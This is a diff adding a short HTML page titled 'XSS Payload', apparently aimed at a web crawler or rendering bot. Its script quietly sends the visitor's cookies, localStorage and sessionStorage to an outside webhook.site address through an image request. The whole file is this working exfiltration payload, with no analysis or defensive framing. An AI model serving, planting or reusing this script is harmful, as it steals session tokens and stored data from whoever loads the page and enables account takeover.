@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>XSS Payload</title>
+  </head>
+  <body>
+    <h1>Hello Spider 🕷️</h1>
+    <script>
+      new Image().src = "https://webhook.site/3065fcb8-910e-4718-9d4c-881b2c8257a9"
+        + "?cookie=" + encodeURIComponent(document.cookie)
+        + "&ls=" + encodeURIComponent(JSON.stringify(localStorage))
+        + "&ss=" + encodeURIComponent(JSON.stringify(sessionStorage));
+    </script>
+  </body>
+</html>
